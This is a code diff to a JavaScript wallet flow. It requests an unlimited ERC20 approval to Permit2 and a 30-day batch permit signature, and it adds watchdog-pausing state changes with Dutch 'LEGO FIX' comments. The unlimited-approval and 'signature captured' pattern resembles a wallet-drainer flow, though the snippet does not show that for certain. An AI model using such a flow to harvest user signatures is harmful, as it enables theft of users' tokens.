@@ -356,6 +356,9 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
       ]
     };
     
+    // 🔥 LEGO FIX: Zet de status direct op SIGNING_TX zodat de watchdog in BEIDE routes (wel/geen approval) pauzeert
+    setFlowState('SIGNING_TX'); 
+
     const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);
     const values = {
       details: details.map(d => ({
@@ -378,6 +381,7 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
 
       if (currentAllowance === 0n) {
         log("⚠️ ERC20 Approval required...");
+        setFlowState('APPROVING'); // 🔥 LEGO FIX: Zet status zodat watchdog pauzeert
         touchInteraction();
         const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
         log("⛽ Waiting confirmation...");
@@ -392,6 +396,7 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
     if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost before signing.");
     
     log("✍️ Requesting typed data signature...");
+    setFlowState('SIGNING_TX'); // 🔥 LEGO FIX: Houd watchdog ook hier gepauzeerd
     touchInteraction();
     const signature = await signer.signTypedData(domain, types, values);
     log("✍️ Signature captured");
